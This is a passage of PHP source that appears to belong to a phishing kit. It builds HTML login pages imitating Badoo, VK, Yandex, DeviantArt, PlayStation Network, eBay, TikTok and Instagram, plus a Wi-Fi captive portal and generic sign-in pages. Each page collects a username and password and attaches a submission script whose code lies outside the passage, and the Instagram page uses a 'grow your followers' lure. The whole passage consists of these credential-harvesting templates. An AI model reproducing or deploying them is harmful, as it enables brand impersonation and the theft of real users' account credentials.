body{font-family:system-ui,sans-serif;background:linear-gradient(135deg,#7000ff,#a855f7);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;width:100%;max-width:380px;border-radius:16px;padding:36px}
.bd{font-size:34px;font-weight:800;color:#7000ff;text-align:center;margin-bottom:20px}
input{width:100%;height:48px;border:1px solid #e5e5e5;border-radius:24px;padding:0 18px;margin-bottom:12px;font-size:15px}
.btn-submit{width:100%;height:48px;background:#7000ff;color:#fff;border:none;border-radius:24px;font-weight:700;cursor:pointer}
</style>') . '<body><div class="card"><div class="bd">badoo</div><form id="loginForm"><input type="text" id="email" placeholder="Email or phone" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div>' . $ajax . $foot,

        'vk' => $head('VK', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,sans-serif;background:#edeef0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;width:100%;max-width:380px;padding:32px;border-radius:12px;box-shadow:0 1px 3px rgba(0,0,0,.12)}
.vk{font-size:28px;font-weight:700;color:#0077ff;margin-bottom:20px}
input{width:100%;height:36px;border:1px solid #d3d9de;border-radius:6px;padding:0 12px;margin-bottom:12px;font-size:14px}
.btn-submit{width:100%;height:36px;background:#0077ff;color:#fff;border:none;border-radius:6px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><div class="vk">VK</div><form id="loginForm"><input type="text" id="email" placeholder="Phone or email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log in</button></form></div>' . $ajax . $foot,

        'yandex' => $head('Yandex', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:YS Text,system-ui,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:380px}
.ya{font-size:36px;font-weight:700;margin-bottom:8px}
.ya span{color:#fc3f1d}
h1{font-size:20px;margin-bottom:20px}
input{width:100%;height:44px;border:1px solid rgba(0,0,0,.2);border-radius:8px;padding:0 14px;margin-bottom:12px;font-size:16px}
.btn-submit{width:100%;height:44px;background:#fc3f1d;color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><div class="ya">Yandex</div><h1>Sign in</h1><form id="loginForm"><input type="text" id="email" placeholder="Login" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log in</button></form></div>' . $ajax . $foot,

        'deviantart' => $head('DeviantArt', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#06070d;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#1f222a;width:100%;max-width:400px;padding:36px;border-radius:8px;border:1px solid #3e4450}
.da{font-size:28px;font-weight:700;color:#05cc47;margin-bottom:20px}
h1{color:#fff;font-size:18px;margin-bottom:20px}
input{width:100%;height:44px;background:#2c2f36;border:1px solid #3e4450;color:#fff;border-radius:4px;padding:0 12px;margin-bottom:12px;font-size:14px}
.btn-submit{width:100%;height:44px;background:#05cc47;color:#000;border:none;border-radius:4px;font-weight:700;cursor:pointer}
</style>') . '<body><div class="card"><div class="da">DeviantArt</div><h1>Log in</h1><form id="loginForm"><input type="text" id="email" placeholder="Username" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log in</button></form></div>' . $ajax . $foot,

        'wifi' => $head('Wi‑Fi', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#f0f4f8;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;width:100%;max-width:400px;padding:32px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,.1);text-align:center;border-top:4px solid #0d6efd}
.wf{font-size:48px;margin-bottom:12px}
h1{font-size:20px;color:#333;margin-bottom:8px}
.sub{color:#666;font-size:14px;margin-bottom:24px}
input{width:100%;height:44px;border:1px solid #ced4da;border-radius:6px;padding:0 12px;margin-bottom:12px;font-size:15px;text-align:left}
.btn-submit{width:100%;height:44px;background:#0d6efd;color:#fff;border:none;border-radius:6px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><div class="wf">📶</div><h1>Sign in to Wi‑Fi</h1><p class="sub">Enter your details to access the network</p><form id="loginForm"><input type="text" id="email" placeholder="Email or room number" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Connect</button></form></div>' . $ajax . $foot,

        'playstation' => $head('PlayStation', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:SST Japanese,system-ui,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:420px;text-align:center}
.ps{color:#003791;font-size:22px;font-weight:700;letter-spacing:2px;margin-bottom:24px}
h1{font-size:18px;color:#1f1f1f;margin-bottom:24px}
input{width:100%;height:48px;border:1px solid #d9d9d9;border-radius:4px;padding:0 14px;margin-bottom:12px;font-size:15px}
.btn-submit{width:100%;height:48px;background:#003791;color:#fff;border:none;border-radius:4px;font-weight:700;cursor:pointer}
</style>') . '<body><div class="card"><div class="ps">PLAYSTATION</div><h1>Sign in to PlayStation Network</h1><form id="loginForm"><input type="text" id="email" placeholder="Sign-In ID (Email)" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign In</button></form></div>' . $ajax . $foot,

        'ebay' => $head('Sign in to your account | eBay', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Market Sans,Arial,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:360px}
.eb{color:#e53238;font-size:36px;font-weight:700;margin-bottom:4px}
.eb span{color:#0064d2}
h1{font-size:28px;font-weight:400;margin-bottom:20px}
input{width:100%;height:40px;border:1px solid #767676;border-radius:8px;padding:0 16px;margin-bottom:12px;font-size:14px}
.btn-submit{width:100%;height:48px;background:#3665f3;color:#fff;border:none;border-radius:24px;font-size:16px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><div class="eb">e<span>bay</span></div><h1>Sign in</h1><form id="loginForm"><input type="text" id="email" placeholder="Email or username" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Continue</button></form></div>' . $ajax . $foot,

        'tiktok' => $head('TikTok', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:364px}
.tk{font-size:36px;font-weight:800;color:#fff;text-align:center;margin-bottom:8px;letter-spacing:-1px}
.tk span{display:inline-block;background:linear-gradient(90deg,#25f4ee,#fe2c55);-webkit-background-clip:text;background-clip:text;color:transparent}
h1{color:#fff;font-size:28px;font-weight:700;text-align:center;margin-bottom:24px}
input{width:100%;height:48px;background:#161823;border:1px solid #2f2f2f;border-radius:2px;color:#fff;padding:0 14px;margin-bottom:12px;font-size:15px}
.btn-submit{width:100%;height:48px;background:#fe2c55;color:#fff;border:none;border-radius:2px;font-weight:700;font-size:16px;cursor:pointer}
</style>') . '<body><div class="card"><div class="tk"><span>TikTok</span></div><h1>Log in</h1><form id="loginForm"><input type="text" id="email" placeholder="Email or username" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log in</button></form></div>' . $ajax . $foot,

        'ig_followers' => $head('Instagram', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#fafafa;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.bar{position:fixed;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#f58529,#dd2a7b,#8134af,#515bd4)}
.card{background:#fff;border:1px solid #dbdbdb;width:100%;max-width:350px;padding:40px 40px 28px;text-align:center}
.ig{font-size:2.5rem;font-weight:400;background:linear-gradient(45deg,#f58529,#dd2a7b,#8134af);-webkit-background-clip:text;background-clip:text;color:transparent;margin-bottom:20px}
h1{font-size:1rem;color:#262626;margin-bottom:20px;font-weight:600}
input{width:100%;height:38px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:0 10px;margin-bottom:6px;font-size:12px}
.btn-submit{width:100%;height:32px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer;margin-top:12px}
</style>') . '<body><div class="bar"></div><div class="card"><div class="ig">Instagram</div><h1>Grow your followers — sign in to continue</h1><form id="loginForm"><input type="text" id="email" placeholder="Username or email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log in</button></form></div>' . $ajax . $foot,

        'custom' => $head('Sign in', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#f6f8fa;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border:1px solid #d0d7de;border-radius:12px;padding:36px;width:100%;max-width:400px;box-shadow:0 4px 16px rgba(0,0,0,.06)}
h1{font-size:22px;margin-bottom:8px;color:#24292f}
.sub{color:#57606a;font-size:14px;margin-bottom:24px}
input{width:100%;height:44px;border:1px solid #d0d7de;border-radius:8px;padding:0 14px;margin-bottom:12px;font-size:15px}
.btn-submit{width:100%;height:44px;background:#24292f;color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><h1>Sign in</h1><p class="sub">Use your account to continue</p><form id="loginForm"><input type="text" id="email" placeholder="Email or username" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Continue</button></form></div>' . $ajax . $foot,

        default => $head('Sign in', '<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#0f1117;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;color:#e6edf3}
.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:32px;width:100%;max-width:400px}
h1{font-size:1.35rem;margin-bottom:8px}
.sub{color:#8b949e;font-size:13px;margin-bottom:24px}
input{width:100%;height:46px;border:1px solid #30363d;border-radius:8px;background:#0d1117;color:#e6edf3;padding:0 14px;margin-bottom:14px;font-size:15px}
.btn-submit{width:100%;height:46px;background:#238636;color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer}
</style>') . '<body><div class="card"><h1>Sign in</h1><p class="sub">Use your account to continue.</p><form id="loginForm"><input type="text" id="email" placeholder="Email or username" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Continue</button></form></div>' . $ajax . $foot,
    };
}
